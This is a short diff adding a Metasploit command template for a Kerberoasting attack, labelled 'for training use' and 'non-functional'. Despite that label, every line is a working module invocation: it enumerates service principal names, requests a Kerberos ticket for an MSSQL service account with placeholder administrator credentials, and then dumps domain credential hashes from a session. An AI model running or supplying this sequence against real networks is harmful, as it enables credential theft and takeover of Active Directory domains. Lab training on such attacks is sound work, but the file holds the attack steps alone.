@@ -1,0 +1,21 @@
+# Kerberoasting Attack Template
+# For Training Use – Non-functional Template
+
+use auxiliary/gather/get_spn
+set RHOSTS <TARGET_IP>
+set SMBUser administrator
+set SMBPass password123
+set SMBDomain CORP
+run
+
+use auxiliary/admin/kerberos/get_ticket
+set RHOSTS <TARGET_IP>
+set USERNAME administrator
+set PASSWORD password123
+set DOMAIN CORP
+set SPN MSSQLSvc/sql01.corp.local:1433
+run
+
+use post/windows/gather/credentials/domain_hashdump
+set SESSION 1
+run
